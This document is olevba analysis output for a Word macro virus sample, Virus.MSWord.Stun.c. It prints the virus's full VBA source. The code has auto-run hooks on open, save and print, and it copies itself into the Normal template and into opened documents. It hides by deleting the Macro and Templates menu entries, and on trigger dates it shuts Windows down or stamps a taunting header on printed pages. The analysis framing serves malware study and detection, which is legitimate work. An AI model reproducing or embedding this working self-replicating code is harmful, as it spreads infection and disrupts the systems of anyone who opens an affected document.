olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stun.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stun.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ffastun.bas 
in file: Virus.MSWord.Stun.c - OLE stream: 'Macros/VBA/ffastun'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error Resume Next
    If (Day(Now()) = 22 And Month(Now()) = 2) Then
        Call TimeToPay
    Else
        Call MyStealthRoutine
        Call InfectTheFile
    End If
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call InfectTheFile
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Private Sub InfectTheFile()
Dim ModInDoc As Object
Dim NormTemp As Object
Dim ActDocInfected, NormInfected As Boolean
Dim i As Integer
    On Error Resume Next
    NormInfected = False
    ActDocInfected = False
    With NormalTemplate.VBProject
    For i = 1 To .VBComponents.Count
        If .VBComponents(i).Name = "ffastun" Then
            Application.NormalTemplate.VBProject.VBComponents("ffastun").Export "c:\ffastun.drv"
            NormInfected = True
        End If
    Next i
    End With
    With ActiveDocument.VBProject
    For i = 1 To .VBComponents.Count
        If .VBComponents(i).Name = "ffastun" Then
            ActDocInfected = True
            Application.ActiveDocument.VBProject.VBComponents("ffastun").Export "c:\ffastun.drv"
        End If
    Next i
    End With
    If NormInfected = False Then
        NormalTemplate.VBProject.VBComponents.Import "c:\ffastun.drv"
        Call MyStealthRoutine
        NormalTemplate.Save
    End If
    If ActDocInfected = False Then
        ActiveDocument.VBProject.VBComponents.Import "c:\ffastun.drv"
        Call MyStealthRoutine
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
End Sub
Public Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call InfectTheFile
End Sub
Private Sub TimeToPay()
        On Error Resume Next
        Dim i As Integer
        Application.EnableCancelKey = wdCancelDisabled
        MsgBox "Illegal function in modul 0xCB15C001", 32
        Tasks.ExitWindows
End Sub
Sub FilePrint()
    On Error Resume Next
    If Day(Now()) = 22 And Month(Now()) = 7 Then
        Dim message$
        message$ = "Microsuck Windows - How Do You Want To Crash Today?" & Chr(13)
        message$ = message$ & " -= Don't Get Mad With Me, Get UNIX =- "
        With ActiveDocument.Sections(1)
            .Headers(wdHeaderFooterPrimary).Range.Text = message$
            Dialogs(wdDialogFilePrint).Show
            .Headers(wdHeaderFooterPrimary).Range.Text = ""
        End With
    Else
        Application.PrintOut
    End If
End Sub
Private Sub MyStealthRoutine()
    On Error Resume Next
        With Application
            'Spanish Version
            .CommandBars("Tools").Controls("Plantillas y complementos...").Delete
            .CommandBars("Tools").Controls("Macro").Delete
            .CommandBars("Format").Controls("Estilo...").Delete
            'English Version
            .CommandBars("Tools").Controls("Macro").Delete
            .CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
            .CommandBars("Format").Controls("Style...").Delete
        End With
End Sub
Private Sub mPrinText(txt As String)
    On Error Resume Next
    ActiveDocument.Sections(1).Range.InsertAfter txt '& Chr(10) & Chr(13)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

